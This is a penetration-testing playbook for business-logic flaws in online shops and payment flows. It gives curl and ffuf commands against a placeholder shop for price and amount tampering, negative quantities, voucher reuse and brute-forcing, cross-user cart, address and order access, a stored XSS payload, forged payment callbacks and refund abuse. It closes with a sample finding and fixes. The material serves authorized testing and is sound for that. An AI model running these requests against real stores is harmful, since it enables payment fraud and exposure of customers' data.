---
name: testing-ecommerce-and-payment-logic
description: Testing business-logic flaws in e-commerce and payment flows including price/product tampering,
  quantity abuse, voucher and gift-card manipulation, cart and shipping IDOR, payment-method and amount tampering,
  currency swaps, refund manipulation, and out-of-stock ordering.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- business-logic
- ecommerce
- payment
- price-tampering
- voucher-abuse
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing E-commerce and Payment Logic

## When to Use

- During authorized penetration tests of online shops, marketplaces, booking systems, and checkout/payment flows
- When the application calculates price, totals, discounts, shipping, tax, or stock and trusts client-supplied values
- For validating that authorization and server-side recomputation protect carts, orders, vouchers, and payments
- When testing voucher/gift-card systems, refunds, cancellations, and multi-step payment hand-offs to gateways
- During bug bounty programs targeting business-logic and broken-access-control issues with direct financial impact

## Prerequisites

- **Authorization**: Written penetration testing agreement; payment testing must use sandbox/test gateways and test cards only
- **Test payment credentials**: Gateway sandbox keys, test PANs (e.g. 4111 1111 1111 1111), and confirmation that no real charges occur
- **Two shopper accounts**: An attacker account and a victim account to prove cart/address/order IDOR
- **Burp Suite**: Repeater for tampering each step, plus history to map the full purchase funnel
- **A baseline legitimate order**: One clean end-to-end purchase captured so every tampered request can be diffed against it

## Critical: Checks Most Often Missed

E-commerce bugs are logic bugs: the server trusts a value it should recompute, or
skips an authorization check between steps. Work this checklist on every flow:

- **Price/amount in the request body.** Look for `price`, `amount`, `total`,
  `unit_price` in add-to-cart, checkout, or the gateway hand-off. Lower it and
  see if the order/charge honors the client value instead of the catalog price.
- **Negative quantity / negative amount = credit.** Set `quantity=-1` or
  `amount=-100`. Buggy totals subtract, producing a credit, refund, or
  balance increase. Also test very large quantities for integer overflow on price.
- **The main request and the sub-request can disagree.** Many checkouts send the
  amount to the app AND separately to the gateway (or in a signed token vs a
  display field). Tamper the amount in ONE of them — confirm whether the
  app charges the displayed value but records the tampered one, or vice-versa.
- **Voucher logic: reuse, stacking, guessing, count/value tamper.** Re-apply a
  single-use voucher after order completion; stack the same code via parameter
  pollution (`code=X&code=X`); brute-force short/sequential codes; tamper the
  discount `value`/`percent`/`count` fields directly.
- **Currency swap.** Change `currency=USD` to `currency=INR`/`IDR` while keeping
  the numeric amount — pay 100 in a weaker unit for a 100 USD item, or exploit
  rounding between currencies.
- **Cart / address / order IDOR.** Add to, view, or delete items in *another
  user's* cart; read/modify someone else's saved shipping address; view/track
  another user's order by ID. Pair with stored XSS in the address fields.
- **Payment-method downgrade.** Force `payment_method=COD` (cash on delivery) or
  `payment_status=paid` on an order that was never paid, skipping the gateway.
- **Refund / cancellation amount manipulation.** Request a refund for more than
  paid, refund an already-refunded order, or cancel-and-keep by tampering the
  refund amount or order state transition.
- **Out-of-stock / inventory bypass.** Order quantities beyond stock, or replay
  the purchase of a sold-out/limited item; combine with a race condition on
  stock decrement.
- **Step-skipping & state confusion.** Jump straight to "order confirmed" or
  "payment success" callback without completing payment; replay a gateway
  success callback to mark unpaid orders paid.
- **Sensitive data exposure.** Check whether responses leak full PAN, CVV, or
  store CVV at all — storing/returning CVV is a direct PCI-DSS violation.

## Workflow

### Step 1: Map the Purchase Funnel

Capture one clean end-to-end order and enumerate every state-changing request.

```text
# With Burp recording, complete a full legitimate purchase as the attacker
# account and list each step + the fields it carries:
#  1. GET  /product/{id}                 -> catalog price
#  2. POST /cart/add        {product_id, quantity, price?}
#  3. GET  /cart            {items[], subtotal, total}
#  4. POST /cart/voucher    {code}
#  5. POST /checkout/address{address_id | address fields}
#  6. POST /checkout/shipping{method, cost}
#  7. POST /checkout/pay    {amount, currency, payment_method, order_id}
#  8. (gateway redirect / callback) /payment/callback {status, amount, sig}
#  9. GET  /order/{id}      {status, total, paid}
# Mark every field the CLIENT supplies that the SERVER should compute.
```

### Step 2: Price and Product Tampering

Test whether the server recomputes price from the catalog or trusts the client.

```bash
# (a) Lower the unit price during add-to-cart:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"product_id":501,"quantity":1,"price":1.00}' \
  "https://shop.example.com/api/cart/add"
# Then GET /cart and check whether total reflects 1.00 instead of catalog price.

# (b) Product ID swap: pay for a cheap item, receive an expensive one by
#     pointing the line item / SKU at a high-value product after pricing:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"cart_item_id":"abc","product_id":999}' \
  "https://shop.example.com/api/cart/update"
# 999 = high-value product; total still reflects the original cheap line.

# (c) Amount tamper at the gateway hand-off (the high-impact one):
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"order_id":"o-1001","amount":1.00,"currency":"USD"}' \
  "https://shop.example.com/api/checkout/pay"
# Confirm whether the captured charge is 1.00 while order shows full value.
```

### Step 3: Quantity Abuse (Including Negative Credit)

Manipulate quantity to drive totals negative or overflow.

```bash
# Negative quantity -> negative line total -> credit / reduced grand total:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"product_id":501,"quantity":-3}' \
  "https://shop.example.com/api/cart/add"
# Check if subtotal/total drops below the price of other items (free goods).

# Mixed cart: add an expensive item (+1) and a cheap item with large negative qty
# to zero out or invert the grand total.

# Integer overflow on price * quantity:
-d '{"product_id":501,"quantity":2147483647}'   # may wrap to a small/negative total

# Fractional / string quantities the backend may mis-handle:
-d '{"product_id":501,"quantity":0.0001}'
-d '{"product_id":501,"quantity":"1e-5"}'
```

### Step 4: Voucher and Gift-Card Manipulation

Test reuse, stacking, guessing, and direct value tampering.

```bash
# (a) Reuse a single-use voucher after the first order completes:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"code":"WELCOME50"}' "https://shop.example.com/api/cart/voucher"
# Apply, checkout, then apply the SAME code on a second order.

# (b) Stack the same voucher twice via parameter pollution / repeated apply:
curl -s -X POST -H "Authorization: $TOKEN_A" \
  --data 'code=WELCOME50&code=WELCOME50' \
  "https://shop.example.com/api/cart/voucher"
# Or call the apply endpoint twice and confirm the discount doubles.

# (c) Brute-force / guess short or sequential codes:
ffuf -u "https://shop.example.com/api/cart/voucher" -X POST \
  -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' -w codes.txt -mr '"discount"' -t 10 -rate 20

# (d) Tamper the voucher value/count/percent directly if client-supplied:
-d '{"code":"WELCOME50","discount_value":99999,"count":5}'
-d '{"code":"WELCOME50","percent":100}'

# (e) Gift-card balance tamper: apply a card and alter its balance field, or
#     redeem the same gift-card code concurrently (race) to double-spend.
```

### Step 5: Cart, Address, and Order IDOR (+ Stored XSS)

Test object-level authorization across users on shopping objects.

```bash
# Cart IDOR: add to / view / delete items in User B's cart with User A's token:
curl -s -H "Authorization: $TOKEN_A" \
  "https://shop.example.com/api/cart/CART_ID_OF_USER_B"
curl -s -X DELETE -H "Authorization: $TOKEN_A" \
  "https://shop.example.com/api/cart/CART_ID_OF_USER_B/items/77"

# Shipping-address IDOR: read or overwrite another user's saved address:
curl -s -H "Authorization: $TOKEN_A" \
  "https://shop.example.com/api/addresses/ADDR_ID_OF_USER_B"
curl -s -X PUT -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"line1":"redirected","city":"x"}' \
  "https://shop.example.com/api/addresses/ADDR_ID_OF_USER_B"

# Stored XSS in address/order fields (renders in admin order dashboard / invoice):
-d '{"line1":"<script>alert(document.domain)</script>","city":"x","zip":"00000"}'

# Order-tracking IDOR: enumerate order IDs to read others' orders/PII:
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "order $id: %{http_code}\n" \
    -H "Authorization: $TOKEN_A" "https://shop.example.com/api/order/$id"
done
```

### Step 6: Payment-Method, Currency, Refund, and Stock Abuse

Tamper the money-moving steps and inventory controls.

```bash
# Payment-method downgrade -> force COD / mark paid without paying:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"order_id":"o-1001","payment_method":"COD"}' \
  "https://shop.example.com/api/checkout/pay"
-d '{"order_id":"o-1001","payment_status":"paid"}'      # state tamper

# Replay/forge the gateway success callback to confirm an unpaid order:
curl -s -X POST "https://shop.example.com/api/payment/callback" \
  -H "Content-Type: application/json" \
  -d '{"order_id":"o-1001","status":"success","amount":1.00}'
# Confirm whether the callback signature is verified.

# Currency swap (same numeric amount, weaker currency):
-d '{"order_id":"o-1001","amount":100,"currency":"IDR"}'   # vs USD item

# Refund manipulation -> refund more than paid / re-refund:
curl -s -X POST -H "Authorization: $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"order_id":"o-1001","refund_amount":500.00}' \
  "https://shop.example.com/api/order/o-1001/refund"   # paid only 50

# Out-of-stock ordering / inventory bypass:
-d '{"product_id":888,"quantity":100}'   # 888 has 0 stock; does it accept?

# CVV/PAN exposure check (PCI): inspect responses for stored/echoed card data:
curl -s -H "Authorization: $TOKEN_A" "https://shop.example.com/api/order/o-1001" \
  | grep -iE '"cvv"|"cvc"|"pan"|"card_number"'
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Price/amount tampering** | Server trusts a client-supplied price/total instead of recomputing from the catalog |
| **Negative quantity/amount** | Negative values invert totals into credits or free goods |
| **Main vs sub-request mismatch** | Amount differs between the app order and the gateway charge/callback |
| **Voucher stacking/reuse** | Applying a single-use or single-instance discount multiple times |
| **Cart/address/order IDOR** | Accessing or modifying another user's shopping objects via predictable IDs |
| **Payment-method downgrade** | Forcing COD or a "paid" state to bypass actual payment |
| **Currency swap** | Keeping the numeric amount while changing to a weaker currency |
| **Refund manipulation** | Refunding more than paid, re-refunding, or cancel-and-keep state abuse |
| **Inventory bypass** | Ordering out-of-stock/limited items, often combined with a stock race |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite (Repeater)** | Tamper each funnel step: price, quantity, voucher, amount, currency, refund |
| **Burp Intruder / ffuf** | Brute-force/guess voucher and gift-card codes; enumerate order IDs |
| **Gateway sandbox (Stripe/Adyen/etc. test mode)** | Safe payment testing with test cards, no real charges |
| **Turbo Intruder** | Race conditions on voucher redemption, gift-card spend, and stock decrement |
| **Two test accounts** | Prove cart/address/order IDOR with cross-user requests |
| **jq** | Diff legitimate vs tampered order/cart responses for total/state changes |

## Common Scenarios

### Scenario 1: Gateway Amount Tamper
The checkout sends `amount` to the payment gateway from the client. Lowering it to 1.00 charges the card 1.00 while the order is fulfilled at full value, because the server never reconciles the captured amount with the order total.

### Scenario 2: Voucher Stacking via Parameter Pollution
A single-use 50% code is applied twice with `code=X&code=X`, compounding the discount to effectively free goods because each apply is processed independently.

### Scenario 3: Negative Quantity Credit
Adding an item with `quantity=-2` subtracts from the grand total, letting the attacker zero out the cart or generate store credit at checkout.

### Scenario 4: Shipping-Address IDOR + Stored XSS
A user updates another customer's saved address via a predictable `address_id`, redirecting their shipments, and injects `<script>` that fires in the admin order dashboard that renders addresses unescaped.

### Scenario 5: Forged Payment Callback
Replaying the gateway success callback with `status=success` marks an unpaid order as paid because the callback signature is not verified server-side.

## Output Format

```
## E-commerce / Payment Logic Finding

**Vulnerability**: Payment Amount Tampering (client-controlled charge)
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/checkout/pay  (field: amount)
**OWASP Category**: A04:2021 - Insecure Design / A01:2021 - Broken Access Control

### Reproduction Steps
1. Add product 501 (catalog price 499.00) to cart and proceed to checkout
2. Intercept POST /api/checkout/pay and change "amount":499.00 to "amount":1.00
3. Complete payment in the gateway sandbox; card is charged 1.00
4. GET /api/order/{id} shows status "paid" with total 499.00 and the item shipped
5. Server did not reconcile captured amount against order total

### Issues Confirmed
| Test | Result |
|------|--------|
| Price tamper in cart/add | Honored client price |
| Gateway amount tamper | Charged 1.00 for 499.00 item |
| Negative quantity | Produced negative line total |
| Voucher reuse (single-use) | Re-applied on second order |
| Voucher stacking (code=X&code=X) | Discount doubled |
| Cart/address/order IDOR | Cross-user access confirmed |
| Forged payment callback | Marked unpaid order paid |
| CVV in order response | Not exposed |

### Impact
- Direct financial loss: goods purchased far below price / for free
- Store-credit generation via negative quantities and over-refunds
- Exposure and modification of other customers' carts, addresses, and orders
- Order fulfillment without genuine payment via callback forgery

### Recommendation
1. Recompute every price, total, tax, shipping, and discount server-side from
   trusted catalog data; never trust client-supplied amounts.
2. Reconcile the gateway-captured amount/currency against the order before
   fulfilment; verify and sign all payment callbacks.
3. Reject non-positive quantities; enforce integer bounds to prevent overflow.
4. Enforce voucher single-use, per-user limits, and atomic redemption; ignore
   duplicate/polluted parameters; use long random non-sequential codes.
5. Apply object-level authorization to carts, addresses, and orders; use
   non-enumerable IDs and escape all stored fields rendered in dashboards.
6. Restrict refund amounts to the captured total and guard order state
   transitions; never store or return CVV (PCI-DSS).
```
